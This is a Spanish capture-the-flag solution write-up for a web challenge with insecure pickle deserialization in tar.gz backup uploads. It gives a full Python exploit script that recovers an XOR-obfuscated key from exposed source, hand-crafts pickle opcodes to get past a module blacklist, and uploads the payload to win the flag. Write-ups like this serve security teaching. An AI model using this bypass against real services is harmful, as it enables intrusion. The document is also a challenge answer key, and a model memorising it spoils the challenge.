# Solución — web-taskflow · Deserialización en Backup

**Categoría:** web · **Dificultad:** insane · **Puntos:** 750 · **Vuln:** Insecure deserialization de pickle en backup tar.gz

---

## Resumen

TaskFlow deserializa automáticamente el archivo `__metadata__.pkl` dentro de los backups importados. Hay una lista negra que bloquea módulos obvios, pero se puede bypassar usando opcodes pickle directos. Además hay que derivar `SERVER_IMPORT_KEY` desde el código fuente ofuscado.

---

## Pasos de Explotación

### Paso 1: Leer el código fuente

`GET /source` expone `app.py`. Encontrar:

```python
_XOR_CONST = 0x5A
_KEY_OBFUSCATED = bytes.fromhex("0e1c77186e39312f2a7709693928692e")
SERVER_IMPORT_KEY = bytes(b ^ _XOR_CONST for b in _KEY_OBFUSCATED).decode()
```

Derivar la clave localmente:

```python
bytes(b ^ 0x5A for b in bytes.fromhex("0e1c77186e39312f2a7709693928692e")).decode()
# => "TF-B4ckup-S3cr3t"
```

### Paso 2: Entender el blacklist

El servidor bloquea estos términos en el payload pickle crudo:

| Bloqueado | No bloqueado |
|-----------|-------------|
| `b'os'` | `b'__main__'` |
| `b'subprocess'` | `b'TaskMetadata'` |
| `b'builtins'` | `b'importlib'` |
| `b'__import__'` | `b'copyreg'` |
| `b'eval'` | — |
| `b'exec'` | — |
| `b'system'` | — |

Clave del bypass: `b'os'` como string literal está bloqueado, pero `__main__` no lo está.
Usando `GLOBAL '__main__' 'TaskMetadata'` se crea una instancia de la clase del servidor
sin referenciar ningún módulo prohibido.

### Paso 3: Craftear el pickle malicioso

Usar opcodes de pickle protocol 2 directamente para crear `TaskMetadata` con `import_key` correcto:

```
PROTO 2
GLOBAL '__main__' 'TaskMetadata'  → referencia a la clase del servidor
EMPTY_TUPLE                        → args vacíos para __init__
REDUCE                             → llama TaskMetadata()
EMPTY_DICT                         → dict vacío base para BUILD
MARK
  SHORT_BINUNICODE 'import_key'
  SHORT_BINUNICODE 'TF-B4ckup-S3cr3t'
  SHORT_BINUNICODE 'project_name'
  SHORT_BINUNICODE 'pwned'
  SHORT_BINUNICODE 'task_count'
  BININT1 0
SETITEMS                           → llena el dict
BUILD                              → aplica el dict como __dict__ del objeto
STOP
```

### Paso 4: Empaquetar en tar.gz y subir

Script completo de explotación:

```python
#!/usr/bin/env python3
"""Exploit — web-taskflow: pickle deserialization en backup tar.gz."""
import io
import json
import re
import struct
import sys
import tarfile
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# 1. Derivar SERVER_IMPORT_KEY del codigo fuente
with urllib.request.urlopen(f"{TARGET}/source") as r:
    src = r.read().decode()

m = re.search(r'bytes\.fromhex\("([0-9a-f]+)"\)', src)
if not m:
    print("[-] No se encontro el hex en el codigo fuente")
    sys.exit(1)

hex_key = m.group(1)
xor_const = 0x5A
server_key = bytes(b ^ xor_const for b in bytes.fromhex(hex_key)).decode()
print(f"[*] SERVER_IMPORT_KEY derivada: {server_key!r}")

# 2. Construir pickle con opcodes directos (sin usar terminos bloqueados)
buf = io.BytesIO()
buf.write(b'\x80\x02')                           # PROTO 2
buf.write(b'c__main__\nTaskMetadata\n')          # GLOBAL __main__.TaskMetadata
buf.write(b')')                                   # EMPTY_TUPLE (args vacios)
buf.write(b'R')                                   # REDUCE -> TaskMetadata()
buf.write(b'}')                                   # EMPTY_DICT (para BUILD)
buf.write(b'(')                                   # MARK

# import_key = server_key
key_field = b'import_key'
buf.write(b'X'); buf.write(struct.pack('<I', len(key_field))); buf.write(key_field)
val = server_key.encode()
buf.write(b'X'); buf.write(struct.pack('<I', len(val))); buf.write(val)

# project_name = 'pwned'
pn_field = b'project_name'
buf.write(b'X'); buf.write(struct.pack('<I', len(pn_field))); buf.write(pn_field)
pn_val = b'pwned'
buf.write(b'X'); buf.write(struct.pack('<I', len(pn_val))); buf.write(pn_val)

# task_count = 0
tc_field = b'task_count'
buf.write(b'X'); buf.write(struct.pack('<I', len(tc_field))); buf.write(tc_field)
buf.write(b'K\x00')                               # BININT1 0

buf.write(b'u')                                   # SETITEMS
buf.write(b'b')                                   # BUILD
buf.write(b'.')                                   # STOP

pkl_data = buf.getvalue()
print(f"[*] Pickle ({len(pkl_data)} bytes) construido")

# Verificar que no hay terminos bloqueados
blacklist = [b"os", b"subprocess", b"builtins", b"__import__", b"eval", b"exec", b"system"]
blocked = [t for t in blacklist if t in pkl_data]
if blocked:
    print(f"[-] ADVERTENCIA: terminos bloqueados detectados: {blocked}")
    sys.exit(1)
print("[*] Blacklist check: OK (ningun termino bloqueado)")

# 3. Empaquetar en tar.gz
tar_buf = io.BytesIO()
with tarfile.open(fileobj=tar_buf, mode="w:gz") as tf:
    info = tarfile.TarInfo(name="exploit/__metadata__.pkl")
    info.size = len(pkl_data)
    tf.addfile(info, io.BytesIO(pkl_data))
tar_data = tar_buf.getvalue()
print(f"[*] tar.gz ({len(tar_data)} bytes) listo")

# 4. Subir al servidor via multipart/form-data
boundary = b"----TaskFlowExploit"
body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="backup"; filename="exploit.tar.gz"\r\n'
    b"Content-Type: application/gzip\r\n\r\n"
    + tar_data + b"\r\n"
    b"--" + boundary + b"--\r\n"
)
req = urllib.request.Request(
    f"{TARGET}/upload",
    data=body,
    headers={"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"},
    method="POST",
)
with urllib.request.urlopen(req) as resp:
    data = json.loads(resp.read())
    print(json.dumps(data, indent=2))
    if "flag" in data:
        print(f"\n[FLAG] {data['flag']}")
```

Uso:

```bash
python3 exploit.py http://<host>:8080
```

---

## Analogia con PHP Phar

Este reto es el equivalente Python de la vulnerabilidad PHP Phar deserialization:

| PHP Phar | Python tar.gz |
|----------|---------------|
| `.phar` contiene stream serializado | `.tar.gz` contiene `__metadata__.pkl` |
| PHP deserializa al abrir el Phar | Python deserializa con `pickle.loads()` |
| Gadget chains en PHP | Opcodes pickle directos en Python |
| `phar://` wrapper trigger | Upload a `/upload` trigger |

---

## Por qué es INSANE

1. **Format analysis** — Entender que un tar.gz puede contener pickle arbitrario (analogia Phar).
2. **Key derivation** — Ingenieria inversa de la ofuscacion XOR desde `/source`.
3. **Blacklist bypass** — Conocimiento de opcodes pickle de bajo nivel para evitar `b'os'`, `b'subprocess'`, `b'builtins'`.
4. **Type constraint** — El objeto debe ser `isinstance(obj, TaskMetadata)` del modulo `__main__` del servidor, lo que requiere usar `GLOBAL '__main__' 'TaskMetadata'` en lugar de serializar una clase local.
5. **Multi-layer** — Combina reconocimiento web, lectura de codigo, criptografia simple y crafting de formato binario.

---

## Nota anti-cheat

Flag dinamica y unica por equipo. La flag se inyecta via variable de entorno `FLAG` en docker-compose.
